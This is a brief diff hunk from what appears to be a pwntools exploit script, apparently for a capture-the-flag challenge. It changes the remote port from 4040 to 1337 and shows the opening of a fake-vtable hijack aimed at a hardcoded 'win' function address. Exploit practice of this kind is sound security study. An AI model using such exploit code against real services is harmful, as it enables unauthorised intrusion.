@@ -5,7 +5,7 @@ import struct
 
 win_func = 0x08048f70
 
-c = pwn.remote(sys.argv[1], 4040)
+c = pwn.remote(sys.argv[1], 1337)
 
 # post fake vtable
 c.send("POST\n")
